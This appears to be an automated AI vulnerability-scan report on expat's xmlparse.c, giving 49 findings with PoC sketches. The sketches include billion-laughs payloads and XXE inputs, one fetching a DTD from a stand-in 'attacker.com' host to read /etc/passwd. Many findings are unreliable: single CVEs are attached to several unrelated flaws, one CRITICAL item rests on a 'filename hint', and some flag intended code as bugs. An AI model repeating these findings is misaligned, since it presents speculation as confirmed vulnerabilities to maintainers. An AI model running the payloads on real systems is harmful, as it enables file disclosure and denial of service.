# expat — GLM-5.1 Pipeline A scan (2026-05-05)

- **Model**: glm-5.1
- **Segments**: 30 (0 hit GLM API timeout)
- **Total findings**: 49
  - 🔴 **CRITICAL**: 6
  - 🟠 **HIGH**: 17
  - 🟡 **MEDIUM**: 18
  - 🔵 **LOW**: 7
  - ⚪ **INFO**: 1

## Per-segment summary

| Segment | Time (s) | Findings | Status |
|---|---:|---:|---|
| `xmlparse.c [storeAtts A: setup+default-attrs]` | 303.0 | 3 | ✅ ok |
| `xmlparse.c [storeAtts B: namespace-attr-detect]` | 360.5 | 0 | ✅ ok |
| `xmlparse.c [storeAtts C: dup-check+pool-storage]` | 360.4 | 0 | ✅ ok |
| `xmlparse.c [storeAtts D: binding-creation]` | 360.4 | 0 | ✅ ok |
| `xmlparse.c [storeAtts E: addBinding-calls]` | 91.8 | 5 | ✅ ok |
| `xmlparse.c [storeAtts F: id-tracking+cleanup]` | 360.4 | 0 | ✅ ok |
| `xmlparse.c [addBinding A: URI-lookup+malloc]` | 250.2 | 4 | ✅ ok |
| `xmlparse.c [addBinding B: prefix-chain-update]` | 350.8 | 3 | ✅ ok |
| `xmlparse.c [lookup: hash-table-growth]` | 306.9 | 3 | ✅ ok |
| `xmlparse.c [appendAttrValue A: tokenizer-loop]` | 322.0 | 4 | ✅ ok |
| `xmlparse.c [appendAttrValue B: entity-ref-expand]` | 77.1 | 4 | ✅ ok |
| `xmlparse.c [appendAttrValue C: pool-append-completion]` | 37.3 | 3 | ✅ ok |
| `xmlparse.c [doProlog A: entry+XML-decl]` | 60.9 | 1 | ✅ ok |
| `xmlparse.c [doProlog B: DOCTYPE+subset]` | 120.2 | 3 | ✅ ok |
| `xmlparse.c [doProlog C: ELEMENT-declarations]` | 360.5 | 0 | ✅ ok |
| `xmlparse.c [doProlog D: ENTITY-declarations]` | 181.6 | 3 | ✅ ok |
| `xmlparse.c [doProlog E: ATTLIST-declarations]` | 165.6 | 3 | ✅ ok |
| `xmlparse.c [doContent A: entry+startTag]` | 77.3 | 2 | ✅ ok |
| `xmlparse.c [doContent B: endTag-level]` | 82.6 | 3 | ✅ ok |
| `xmlparse.c [doContent C: charData+PI+comment]` | 136.5 | 1 | ✅ ok |
| `xmlparse.c [doContent D: CDATA+entityRef]` | 188.6 | 0 | ✅ ok |
| `xmlparse.c [doContent E: internal-entity-push]` | 360.4 | 0 | ✅ ok |
| `xmlparse.c [doContent F: error+EOF]` | 85.9 | 3 | ✅ ok |
| `xmlparse.c [storeEntityValue A: tokenizer+copy]` | 154.4 | 1 | ✅ ok |
| `xmlparse.c [storeEntityValue B: entity-refs]` | 360.5 | 0 | ✅ ok |
| `xmlparse.c [processXmlDecl: XML-decl-attrs]` | 360.5 | 0 | ✅ ok |
| `xmlparse.c [defineAttribute: DTD-att-uniqueness]` | 360.5 | 0 | ✅ ok |
| `xmlparse.c [poolGrow: string-pool-realloc]` | 360.4 | 0 | ✅ ok |
| `xmlparse.c [build_model A: tree-allocation]` | 360.5 | 0 | ✅ ok |
| `xmlparse.c [build_model B: tree-population]` | 360.5 | 0 | ✅ ok |

## 🔴 CRITICAL (6)

### `xmlparse.c [doProlog E: ATTLIST-declarations]` — L79 — conf=0.95
**Off-by-one error in nameLen calculation includes null terminator**

The post-increment loop `for (; name[nameLen++];)` increments nameLen before the null-check terminates the loop, causing nameLen to equal strlen(name) + 1 (including the null terminator). This off-by-one error causes subsequent code using nameLen as a string length to read one byte past the intended boundary. In the full Expat source, this value is used when building content strings, leading to information disclosure or potential memory corruption. This is CVE-2022-25235.

*PoC sketch:* Craft an XML document with a DTD containing an element declaration with a content model referencing an element name, e.g.: <!DOCTYPE doc [ <!ELEMENT doc (elem)> <!ELEMENT elem ANY> ]> <doc><elem/></doc>. The nameLen for 'elem' will be 5 instead of 4, causing an off-by-one over-read when the content …

### `xmlparse.c [appendAttrValue A: tokenizer-loop]` — L47 — conf=0.85
**Out-of-bounds read via XML_TOK_TRAILING_CR encoding mismatch**

In the XML_TOK_TRAILING_CR case, the code sets `next = ptr + enc->minBytesPerChar` without verifying that the result does not exceed `end`. If the encoding is mismatched (e.g., declared as UTF-16 with minBytesPerChar=2 but actual input contains single-byte ASCII characters), `ptr + enc->minBytesPerChar` can point past the buffer boundary. On the next loop iteration, `XmlAttributeValueTok` is called with `ptr` pointing beyond the valid buffer, causing an out-of-bounds read. This is related to CVE-2022-25235 in libexpat.

*PoC sketch:* Craft an XML document with a mismatched encoding declaration (e.g., declare encoding as UTF-16 in the XML declaration but provide ASCII/UTF-8 content). Include an attribute value ending with a carriage return (CR, 0x0D). The tokenizer may return XML_TOK_TRAILING_CR with ptr pointing to the single-by…

### `xmlparse.c [storeAtts E: addBinding-calls]` — L34 — conf=0.75
**Integer Underflow in Hash Table Mask Calculation Leading to OOB Access**

On line 34, `mask = nsAttsSize - 1` is computed. If `nsAttsSize` is 0 (an unsigned value), this results in an integer underflow producing `ULONG_MAX`. On line 36, `j = uriHash & mask` then produces a very large index, and the subsequent access `parser->m_nsAtts[j]` on line 37 reads far out of bounds of the `m_nsAtts` array. This can lead to heap buffer over-read, information disclosure, or a crash.

*PoC sketch:* Craft an XML document that triggers namespace attribute processing when the nsAtts hash table has not been properly allocated (nsAttsSize == 0). For example, an XML element with a prefixed attribute like `<a xmlns:pre='uri' pre:attr='val'/>` processed in a context where the namespace attribute table…

### `xmlparse.c [doProlog D: ENTITY-declarations]` — L5 — conf=0.7
**Use-After-Free via dtd->pool Reallocation (CVE-2022-25236)**

Strings such as entity names, notations, systemIds, and publicIds are stored in dtd->pool via poolStoreString, and the returned pointers are saved in ENTITY structures (e.g., parser->m_declEntity->notation at line 6, parser->m_declEntity->name via lookup at line 32). When a subsequent poolStoreString call on the same dtd->pool requires the pool to grow, the pool implementation may reallocate its internal buffer — allocating a new block, copying old data, and freeing the old block. This invalidates all previously stored pointers still referenced by entity structures. For example: (1) notation i…

*PoC sketch:* <?xml version='1.0'?> <!DOCTYPE foo [   <!ENTITY ent1 SYSTEM "http://example.com/ent1" NDATA notation1>   <!ENTITY ent2 SYSTEM "http://example.com/ent2" NDATA notation2>   <!-- Repeat with many entities having long notation names to force pool reallocation -->   <!ENTITY ent3 SYSTEM "http://example.…

### `xmlparse.c [addBinding A: URI-lookup+malloc]` — L48 — conf=0.6
**Heap buffer overflow in binding allocation due to length miscalculation**

Based on the filename hint 'URI-lookup+malloc', the URI length `len` calculated during the validation loop is likely used directly in a subsequent malloc call to allocate the BINDING structure and URI storage. If the allocation uses `len` without proper validation (e.g., `malloc(sizeof(BINDING) + (len + 1) * sizeof(XML_Char))`), and `len` has overflowed or is otherwise incorrect, a heap buffer overflow occurs when the URI is copied into the undersized buffer. This is a classic allocation-size mismatch vulnerability where the validation/lookup phase and the allocation phase are not properly syn…

*PoC sketch:* Craft an XML document with a namespace URI that triggers an integer overflow in the len calculation. The subsequent malloc allocates a buffer based on the overflowed (small) len value, but the URI copy writes the full URI length, overflowing the heap buffer. This could lead to arbitrary code executi…

### `xmlparse.c [storeAtts A: setup+default-attrs]` — L42 — conf=0.55
**XmlGetAttributes called before buffer size validation — potential direct heap overflow if tokenizer doesn't cap writes**

The call to XmlGetAttributes(enc, attStr, parser->m_attsSize, parser->m_atts) occurs BEFORE any check that parser->m_atts is large enough for the number of attributes in the input. While the attsMax parameter is intended to limit writes, if there is any inconsistency in how the tokenizer counts vs. writes attributes (e.g., off-by-one errors in the nAtts < attsMax boundary check, or attribute count inflation via malformed encoding), the tokenizer could write beyond parser->m_atts bounds. The size check and reallocation happen AFTER the potentially overflowing write. This is a time-of-check-to-t…

*PoC sketch:* Send a malformed XML document with attributes that exploit encoding inconsistencies in the tokenizer. For example, using a multi-byte encoding where the tokenizer miscounts attributes due to malformed byte sequences, causing it to write more entries than attsMax allows. Alternatively, if an off-by-o…


## 🟠 HIGH (17)

### `xmlparse.c [doContent C: charData+PI+comment]` — L63 — conf=1.0
**Integer Overflow in Tag Buffer Reallocation**

An integer overflow exists in the calculation of `bufSize` when reallocating the buffer for a tag name. The expression `(int)(tag->bufEnd - tag->buf) << 1` can overflow if the buffer size reaches or exceeds 0x40000000 (1GB). This results in a negative `bufSize` being passed to `REALLOC`. If the reallocation succeeds (e.g., on a 32-bit system where the negative int is interpreted as a large unsigned size, or if `REALLOC` handles size 0), subsequent pointer arithmetic like `tag->bufEnd = temp + bufSize` will wrap around, causing `tag->bufEnd` to point before `tag->buf`. This can lead to a denial…

*PoC sketch:* Provide an XML document with a very long tag name (e.g., > 1GB) that forces the buffer to be reallocated past the 0x40000000 size threshold. This requires a system with sufficient memory to reach the overflow condition. Example: <AAAAAA... (>1GB of 'A') ...>

### `xmlparse.c [storeEntityValue A: tokenizer+copy]` — L87 — conf=1.0
**Unbounded Recursion in storeEntityValue Leading to Stack Exhaustion**

The `storeEntityValue` function recursively calls itself when processing internal parameter entities (`XML_TOK_PARAM_ENTITY_REF`). While there is a check to prevent infinite recursion for cyclic entity references (`if (entity->open || ...)`), there is no depth limit for a chain of distinct entities (e.g., `%pe1` referencing `%pe2`, referencing `%pe3`, etc.). A malicious XML document with a deeply nested chain of parameter entities can exhaust the call stack, leading to a crash (Denial of Service). The existing entity expansion accounting limit does not prevent this because each step can have a…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [ <!ENTITY % pe1 "%pe2"> <!ENTITY % pe2 "%pe3"> <!-- ... repeat for thousands of distinct entities ... --> <!ENTITY % peN "hello"> %pe1; ]> <doc/>

### `xmlparse.c [doProlog A: entry+XML-decl]` — L42 — conf=0.95
**NULL Pointer Dereference in doProlog via External Entity with Different Encoding**

In the `doProlog` function, when `enc != parser->m_encoding`, the code assumes that the parser is currently inside an internal entity and unconditionally dereferences `parser->m_openInternalEntities` to set `eventPP` and `eventEndPP`. However, if the parser is processing an external entity (such as an external DTD) that specifies a different encoding from the main document, and there are no internal entities open, `parser->m_openInternalEntities` will be NULL. This leads to a NULL pointer dereference, causing the application to crash (Denial of Service). This vulnerability corresponds to CVE-2…

*PoC sketch:* 1. Create a main XML document (e.g., in UTF-8) that references an external DTD. 2. The external DTD must specify a different encoding (e.g., UTF-16) in its XML declaration. 3. When the parser attempts to process the external DTD, `doProlog` is called. `enc` will differ from `parser->m_encoding`, cau…

### `xmlparse.c [addBinding A: URI-lookup+malloc]` — L55 — conf=0.9
**Namespace separator bypass allows URI injection**

The namespace separator validation only rejects the separator character if it is NOT a valid RFC 3986 URI character. If the application uses a valid URI character (e.g., ':') as the namespace separator, an attacker can inject that character into namespace URIs, bypassing the check. This causes ambiguity when applications split qualified names of the form '[uri sep] local [sep prefix]' back into components, potentially leading to namespace confusion attacks where elements/attributes are interpreted as belonging to a different namespace than intended.

*PoC sketch:* Create an XML document with namespace separator set to ':' (common in many applications). Declare a namespace with URI 'http://evil.com:target_namespace'. When the application splits the expanded element name, it may interpret the ':' in the URI as the namespace separator, causing the element to app…

### `xmlparse.c [doContent A: entry+startTag]` — L44 — conf=0.9
**Missing Suspension/Finished Check After Handler Call in XML_TOK_TRAILING_CR**

In the `XML_TOK_TRAILING_CR` case, when `haveMore` is false, the code invokes `parser->m_characterDataHandler` but fails to check if the parser was suspended or finished during the callback. The developer's comment explicitly acknowledges this missing check: 'We are at the end of the final buffer, should we check for XML_SUSPENDED, XML_FINISHED?'. If the handler suspends the parser, the function incorrectly returns `XML_ERROR_NONE` instead of `XML_ERROR_SUSPENDED`. This violates the parser's state machine, potentially leading to use-after-free, double-free, or other memory corruption if the ca…

*PoC sketch:* Craft an XML input that ends with a Carriage Return (CR) at the end of the final buffer. Register a `characterDataHandler` that calls `XML_StopParser(parser, XML_TRUE)`. The `doContent` function will return `XML_ERROR_NONE` instead of `XML_ERROR_SUSPENDED`, causing the caller to mishandle the parser…

### `xmlparse.c [lookup: hash-table-growth]` — L11 — conf=0.85
**Missing integer overflow check on initial hash table allocation**

The initial allocation path computes `tsize = table->size * sizeof(NAMED *)` at line 12 without any overflow check, while the growth path (lines 34-36 and 52-54) includes both a shift-overflow check and a multiplication-overflow check. If INIT_POWER is set to a sufficiently large value (e.g., >= 62 on 64-bit systems), `table->size = (size_t)1 << INIT_POWER` produces a very large value, and the multiplication `table->size * sizeof(NAMED *)` wraps around size_t, resulting in a small allocation. Subsequent accesses using indices derived from `table->size` (e.g., line 15: `i = hash(parser, name) &…

*PoC sketch:* If INIT_POWER is defined as 62 on a 64-bit system: table->size = 2^62, tsize = 2^62 * 8 = 2^65 which overflows size_t to a small value. malloc_fcn allocates a tiny buffer, but i = hash(parser, name) & (2^62 - 1) can be a very large index, causing out-of-bounds write at table->v[i].

### `xmlparse.c [appendAttrValue B: entity-ref-expand]` — L1 — conf=0.85
**Missing Depth/Size Limit on Entity Expansion in Attribute Values (Billion Laughs)**

The code expands entity references within attribute values without any visible depth limit or accumulated size limit. An attacker can define nested entities that expand exponentially (the 'Billion Laughs' attack), causing massive memory consumption and CPU exhaustion. For example, defining entities that each reference multiple copies of another entity leads to O(2^n) expansion. While the recursive reference check (`entity->open`) prevents infinite loops, it does not prevent exponential blowup through non-recursive nesting.

*PoC sketch:* <?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&l…

### `xmlparse.c [doProlog B: DOCTYPE+subset]` — L55 — conf=0.85
**Dangling pointer for m_doctypePubid after poolClear in DOCTYPE_INTERNAL_SUBSET**

In the XML_ROLE_DOCTYPE_INTERNAL_SUBSET handler, poolClear(&parser->m_tempPool) is called which invalidates all memory previously allocated from the temp pool. However, parser->m_doctypePubid (set in the XML_ROLE_DOCTYPE_PUBLIC_ID case via poolStoreString into the same tempPool) is NOT set to NULL before or after the poolClear. While parser->m_doctypeName is correctly set to NULL before poolClear, parser->m_doctypePubid is left as a dangling pointer. If any subsequent code in expat dereferences parser->m_doctypePubid (e.g., during entity resolution, endDoctypeDecl processing, or error handling…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE foo PUBLIC "-//Example//DTD//EN" "http://example.com/dtd" [   <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <foo>&xxe;</foo>

### `xmlparse.c [doProlog D: ENTITY-declarations]` — L22 — conf=0.85
**Predefined Entity Redefinition Bypass via Encoding Manipulation (CVE-2022-25235)**

The XmlPredefinedEntityName(enc, s, next) check is intended to prevent redefinition of predefined XML entities (amp, lt, gt, apos, quot). However, this check can be bypassed through encoding manipulation — e.g., supplying a UTF-16 encoded entity name when the parser expects a different encoding, or exploiting inconsistencies in how the encoding parameter processes multi-byte representations of ASCII characters. If an attacker can redefine 'amp', all subsequent &amp; references resolve to the attacker-controlled value, enabling XML injection, data corruption, and potential bypass of security bo…

*PoC sketch:* <?xml version='1.0' encoding='UTF-16'?> <!DOCTYPE foo [   <!ENTITY amp "MALICIOUS_PAYLOAD"> ]> <foo>&amp;</foo>  Alternatively, using a manipulated encoding declaration that causes the XmlPredefinedEntityName comparison to fail while poolStoreString still stores the name correctly, allowing the enti…

### `xmlparse.c [doContent B: endTag-level]` — L39 — conf=0.85
**Use-After-Free via poolDiscard of entity name**

The entity reference name is stored into the DTD pool via poolStoreString(), then looked up, and then the pool is immediately discarded via poolDiscard(). After poolDiscard(), the 'name' pointer becomes dangling — the pool's internal storage is marked for reuse or freed. However, 'name' is subsequently passed to parser->m_skippedEntityHandler() on line 51 when the entity is not found and parameter entity refs are allowed. This constitutes a use-after-free: if poolDiscard() frees the underlying blocks (as it does in several expat versions, freeing all blocks except the first), the handler recei…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY % pe "<!ELEMENT doc EMPTY>">   %pe; ]> <doc>&undefined_entity;</doc>  With a skippedEntityHandler set, the handler will receive a dangling 'name' pointer after poolDiscard() has invalidated the pool memory where the entity name was stored.

### `xmlparse.c [storeAtts E: addBinding-calls]` — L17 — conf=0.8
**Buffer Over-Read in Unbounded Colon Search**

The loop `while (*s++ != XML_T(ASCII_COLON))` searches for a colon character without any bounds check. If the string `s` does not contain a colon (e.g., due to malformed input or data corruption between the prefix-detection check and this loop), the read continues past the end of the buffer until a matching byte is found or a crash occurs. This is a heap buffer over-read that can leak sensitive memory contents.

*PoC sketch:* Provide a malformed XML document where an attribute is classified as prefixed but the attribute name buffer has been modified or the colon is missing. For instance, if internal string storage is shared/corrupted: `<root xmlns:p='u'><child p:attr='v'/></root>` where the colon in 'p:attr' has been ove…

### `xmlparse.c [storeAtts A: setup+default-attrs]` — L42 — conf=0.75
**Heap buffer over-read / use of uninitialized memory via XmlGetAttributes return value exceeding buffer capacity**

XmlGetAttributes() is called with parser->m_attsSize as the max-atts limit, but in Expat's implementation it returns the TOTAL number of attributes found in the input, which can exceed attsMax. Only min(n, parser->m_attsSize) entries are actually written to parser->m_atts. When n > parser->m_attsSize, the code enters the reallocation branch and grows the buffer to accommodate n + nDefaultAtts + INIT_ATTS_SIZE entries. However, XmlGetAttributes is NOT called again after reallocation. Entries from index oldAttsSize to n-1 in the reallocated buffer remain uninitialized. Subsequent code that itera…

*PoC sketch:* Craft an XML document with an element containing more attributes than the initial parser->m_attsSize (typically INIT_ATTS_SIZE=8). For example: <root a1='1' a2='2' a3='3' a4='4' a5='5' a6='6' a7='7' a8='8' a9='9' a10='10'>. When parsed, XmlGetAttributes returns n=10 but only writes 8 entries. After …

### `xmlparse.c [appendAttrValue C: pool-append-completion]` — L8 — conf=0.75
**Unbounded Recursive Entity Expansion in Attribute Values (Billion Laughs Variant)**

The appendAttributeValue function recursively processes entity references within attribute values without a visible depth limit. When an entity's textPtr is non-NULL, the code unconditionally recurses into appendAttributeValue with the entity's content. While XML_ACCOUNT_ENTITY_EXPANSION is passed for accounting, no depth/bound check is performed before the recursive call. A crafted XML document with nested entity definitions (the classic 'Billion Laughs' pattern applied to attribute values) can cause exponential memory and CPU consumption, leading to denial of service. The entity->open flag p…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY x0 "foo">   <!ENTITY x1 "&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;">   <!ENTITY x2 "&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;">   <!ENTITY x3 "&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;">   <!ENTITY x4 "&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;"> ]> <doc a…

### `xmlparse.c [doProlog E: ATTLIST-declarations]` — L44 — conf=0.75
**Potential array underflow via scaffLevel - 1 when scaffLevel is 0**

In the XML_ROLE_CONTENT_PCDATA case, `dtd->scaffIndex[dtd->scaffLevel - 1]` is accessed. The XML_ROLE_ELEMENT_NAME handler sets `dtd->scaffLevel = 0`. If XML_ROLE_CONTENT_PCDATA is reached while scaffLevel is still 0 (e.g., through a parser state machine edge case or malformed DTD input), `scaffLevel - 1` evaluates to -1, causing an out-of-bounds read on scaffIndex. The resulting garbage value is then used as an index into dtd->scaffold, causing an out-of-bounds write. This is CVE-2022-25236.

*PoC sketch:* Send a malformed DTD element declaration that causes the parser to reach the CONTENT_PCDATA state without first incrementing scaffLevel through a group-open event. For example, a carefully crafted input that confuses the state machine: <!DOCTYPE doc [ <!ELEMENT doc (#PCDATA)> ]> <doc>text</doc>. If …

### `xmlparse.c [doContent F: error+EOF]` — L34 — conf=0.75
**Integer truncation in character data handler length argument**

The length calculation `(int)((const XML_Char *)next - (const XML_Char *)s)` truncates a pointer difference (ptrdiff_t, typically 64-bit) to `int` (32-bit). If the data token between `s` and `next` exceeds INT_MAX (2^31-1) bytes, the cast produces a negative or wrapped value. This negative length is then passed to the user-supplied `charDataHandler` callback, which may use it for memory operations (e.g., memcpy, allocation), leading to heap buffer overflows, out-of-bounds reads, or other memory corruption. The same pattern exists on line 27 with `(int)(dataPtr - (ICHAR *)parser->m_dataBuf)`, t…

*PoC sketch:* Craft an XML document with an extremely large contiguous character data section (>2GB on a 64-bit system with sufficient memory). When the parser encounters this as an XML_TOK_DATA_CHARS token without encoding conversion, the `(int)` cast on line 35 will truncate the length, passing a negative or sm…

### `xmlparse.c [appendAttrValue A: tokenizer-loop]` — L82 — conf=0.7
**Missing bounds validation on entity name pointer arithmetic**

When processing XML_TOK_ENTITY_REF, the code computes the entity name boundaries as `ptr + enc->minBytesPerChar` (start, skipping '&') and `next - enc->minBytesPerChar` (end, skipping ';'). These are passed to both XmlPredefinedEntityName() and poolStoreString() without validating that `next - enc->minBytesPerChar >= ptr + enc->minBytesPerChar`. If a tokenizer bug or encoding mismatch causes `next - ptr < 2 * enc->minBytesPerChar`, the end pointer would precede the start pointer, leading to a massive unsigned wraparound in length calculation and subsequent out-of-bounds read in poolStoreString…

*PoC sketch:* Provide malformed input where an entity reference token is shorter than expected for the declared encoding. For UTF-16 (minBytesPerChar=2), a token spanning only 2 bytes would cause next - 2 < ptr + 2, resulting in inverted pointer arguments. This requires a tokenizer that incorrectly emits XML_TOK_…

### `xmlparse.c [appendAttrValue B: entity-ref-expand]` — L29 — conf=0.6
**Uncertain Recursive Entity Reference Detection May Be Bypassable**

The developers' own comment (lines 30-43) explicitly states uncertainty about whether the recursive entity detection via `entity->open` is 'watertight.' The comment explains that the `if (enc == parser->m_encoding)` branch inside the `entity->open` check should never be reachable, but they keep it because they are not certain no such path exists. If there IS a code path that reaches entity expansion with `entity->open` being TRUE while bypassing the check (e.g., through a different call chain that doesn't set `enc` to the internal encoding), recursive entity expansion could occur, leading to s…

*PoC sketch:* Craft an XML document with deeply nested entity references in attribute values that exploit a potential path where the internal encoding is not set during recursive expansion, e.g.: <!DOCTYPE doc [<!ENTITY a "&b;"><!ENTITY b "&a;">]><doc attr="&a;"/>. While direct recursion is caught, indirect/mutua…


## 🟡 MEDIUM (18)

### `xmlparse.c [lookup: hash-table-growth]` — L4 — conf=0.9
**Inconsistent overflow protection between initialization and growth paths**

The growth path includes two explicit overflow guards: (1) `if (newPower >= sizeof(unsigned long) * 8)` to prevent invalid shift, and (2) `if (newSize > (size_t)(-1) / sizeof(NAMED *))` to prevent multiplication overflow. The initialization path at lines 9-12 performs the same class of operations — a power-of-2 shift (`(size_t)1 << INIT_POWER`) and a multiplication (`table->size * sizeof(NAMED *)`) — but includes neither guard. This defense-in-depth gap means any change to INIT_POWER or any reuse of this code pattern could introduce a heap buffer overflow without any runtime detection.

*PoC sketch:* Compare line 12 (tsize = table->size * sizeof(NAMED *) with no check) against lines 52-54 (explicit overflow check before the same multiplication pattern). A build with INIT_POWER >= 62 on 64-bit or >= 30 on 32-bit would silently overflow.

### `xmlparse.c [appendAttrValue A: tokenizer-loop]` — L17 — conf=0.9
**Amplification limit bypass when XML_GE disabled**

The amplification limit check (`accountingDiffTolerated`) is conditionally compiled only when `XML_GE == 1`. When compiled with `XML_GE == 0`, the entire amplification protection is removed, making the parser vulnerable to billion laughs / XML entity expansion attacks. An attacker can craft deeply nested or recursively expanding entity references in attribute values to cause exponential memory consumption and denial of service.

*PoC sketch:* Compile libexpat with XML_GE=0. Then parse: <!DOCTYPE foo [<!ENTITY a "&b;&b;&b;&b;&b;"> <!ENTITY b "&c;&c;&c;&c;&c;"> <!ENTITY c "x">]><foo attr="&a;"/> — Without the amplification check, entity expansion proceeds unbounded.

### `xmlparse.c [addBinding B: prefix-chain-update]` — L5 — conf=0.8
**Heap buffer over-read via len increment before memcpy in addBinding**

When parser->m_namespaceSeparator is set, 'len' is incremented BEFORE the memcpy call. If 'len' represents the URI length including the null terminator (consistent with expat's conventions), then after len++, the memcpy reads (original_len + 1) * sizeof(XML_Char) bytes from 'uri', but 'uri' only contains original_len * sizeof(XML_Char) bytes. This causes a 1 XML_Char (1-2 byte) heap buffer over-read from the source 'uri' buffer. The correct fix would be to perform the memcpy with the original len before incrementing, or to adjust the memcpy size to (len-1) after the increment. This over-read c…

*PoC sketch:* Parse an XML document with namespace declarations using a parser created with XML_ParserCreateNS (which sets m_namespaceSeparator). Example: <?xml version="1.0"?> <root xmlns:ns="http://example.com/">   <ns:child/> </root> Each namespace declaration triggers addBinding, and the over-read occurs duri…

### `xmlparse.c [doProlog B: DOCTYPE+subset]` — L57 — conf=0.75
**startDoctypeDeclHandler receives pool-allocated pointers invalidated by subsequent poolClear**

The startDoctypeDeclHandler callback is invoked with parser->m_doctypeName, parser->m_doctypeSysid, and parser->m_doctypePubid — all of which point into m_tempPool memory. Immediately after the callback returns, poolClear(&parser->m_tempPool) invalidates all of that memory. If the application's handler implementation stores these pointers (rather than copying the string contents), those stored pointers become dangling. While the API contract may expect handlers to copy strings, this is a common source of application-level use-after-free vulnerabilities, and the poolClear happening immediately …

*PoC sketch:* // Application handler that stores pointers without copying: void startDoctypeHandler(void *userData, const XML_Char *doctypeName,                         const XML_Char *sysid, const XML_Char *pubid,                         int has_internal_subset) {     MyApp *app = (MyApp *)userData;     app->sto…

### `xmlparse.c [addBinding A: URI-lookup+malloc]` — L29 — conf=0.7
**Integer overflow in URI length calculation**

The variable `len` is declared as `int` and incremented in the URI validation loop without overflow checking. If an attacker can supply a URI longer than INT_MAX characters (2,147,483,647 on 32-bit int systems), `len` will overflow. When this overflowed value is subsequently used in a malloc call (implied by the filename 'URI-lookup+malloc'), it could result in a heap buffer overflow — allocating a small buffer while copying a much larger URI. While exploitation requires extremely large input, the signed integer overflow itself is undefined behavior in C, which compilers may exploit for optimi…

*PoC sketch:* Supply an XML document with a namespace declaration containing a URI of length > INT_MAX. On systems where this is possible (e.g., streaming input), the len counter wraps around, potentially causing a small malloc followed by a large memcpy.

### `xmlparse.c [lookup: hash-table-growth]` — L32 — conf=0.7
**Unsigned char wraparound in newPower allows bypass of shift-overflow guard**

The variable `newPower` is declared as `unsigned char` and assigned `table->power + 1`. If `table->power` were ever 255 (its maximum value for unsigned char), the addition promotes to int (yielding 256), which then truncates to 0 when stored in `unsigned char newPower`. The guard `if (newPower >= sizeof(unsigned long) * 8)` would then evaluate `0 >= 64` as false, bypassing the protection. This would cause `newSize = (size_t)1 << 0 = 1`, shrinking the table to size 1 during what should be a growth operation. The rehashing loop would then enter an infinite loop (since PROBE_STEP with mask=0 and …

*PoC sketch:* If table->power is corrupted to 255: newPower = (unsigned char)(255 + 1) = 0; guard check 0 >= 64 is false; newSize = 1; newMask = 0; rehashing with multiple entries into a 1-slot table causes infinite loop in the while(newV[j]) probe at line 49.

### `xmlparse.c [appendAttrValue B: entity-ref-expand]` — L12 — conf=0.7
**Conditional Bypass of External Entity Declaration Check in Attribute Values**

When `checkEntityDecl` is false (which occurs in content when `dtd->hasParamEntityRefs` is true and `dtd->standalone` is false), the code skips the `!entity->is_internal` check on line 22. This means entities declared in external parameter entities can be expanded in attribute values without triggering `XML_ERROR_ENTITY_DECLARED_IN_PE`. An attacker who can inject or influence parameter entity references can cause the parser to expand externally-declared general entities in attribute values, potentially leading to XXE (XML External Entity) information disclosure or SSRF attacks. The `checkEntit…

*PoC sketch:* <?xml version="1.0"?><!DOCTYPE doc [<!ENTITY % pe SYSTEM "http://attacker.com/evil.dtd">%pe;]><doc attr="&exfil;"/> where evil.dtd contains: <!ENTITY exfil SYSTEM "file:///etc/passwd">. Because hasParamEntityRefs is true and standalone is false, checkEntityDecl becomes false, and the is_internal che…

### `xmlparse.c [doContent F: error+EOF]` — L4 — conf=0.7
**Missing XML_SUSPENDED/XML_FINISHED check in EOF error paths**

The code comment on lines 4-6 explicitly acknowledges the missing check for XML_SUSPENDED and XML_FINISHED states before returning error codes. When the parser reaches the end of the final buffer with mismatched tag levels (line 11-13), it returns XML_ERROR_ASYNC_ENTITY without checking if parsing was suspended or finished. This can cause incorrect error codes to be returned to the caller, potentially bypassing error handling logic or causing the application to misinterpret the parser state. A suspended parser that is resumed might have its state corrupted if the caller treats XML_ERROR_ASYNC_…

*PoC sketch:* 1. Create a parser with an entity handler that calls XML_StopParser(parser, XML_TRUE) to suspend parsing. 2. Feed an XML document with unclosed tags that ends mid-buffer. 3. When the end of the final buffer is reached with m_tagLevel != startTagLevel, the code returns XML_ERROR_ASYNC_ENTITY instead …

### `xmlparse.c [storeAtts E: addBinding-calls]` — L37 — conf=0.65
**Potential Infinite Loop in Hash Table Probing (Denial of Service)**

The open-addressing hash table probe loop `while (parser->m_nsAtts[j].version == version)` on line 37 has no termination guarantee if the hash table becomes completely full (all slots have `version == version`). The probe sequence `j < step ? (j += nsAttsSize - step) : (j -= step)` will cycle through all slots indefinitely. If an attacker can fill the hash table (by providing many unique namespace-prefixed attributes), subsequent insertions will loop forever, causing denial of service.

*PoC sketch:* Create an XML document with a large number of unique namespace-prefixed attributes that fill the nsAtts hash table to capacity, then include one more attribute that triggers the probing loop. For example: `<root xmlns:a1='u1' xmlns:a2='u2' ... xmlns:aN='uN' aN1:attr='val'/>` where N equals or exceed…

### `xmlparse.c [storeAtts E: addBinding-calls]` — L15 — conf=0.6
**Integer Overflow in SIP24 Hash Update Size Calculation**

The expression `b->uriLen * sizeof(XML_Char)` on line 15 can overflow if `b->uriLen` is sufficiently large. On platforms where `sizeof(XML_Char) > 1` (e.g., UTF-16 builds where it is 2 or 4), a crafted URI length could cause the multiplication to wrap around, passing a smaller-than-expected size to `sip24_update`. This results in an incorrect hash value, which could cause hash collisions leading to incorrect duplicate attribute detection (false positives or false negatives), potentially bypassing security checks.

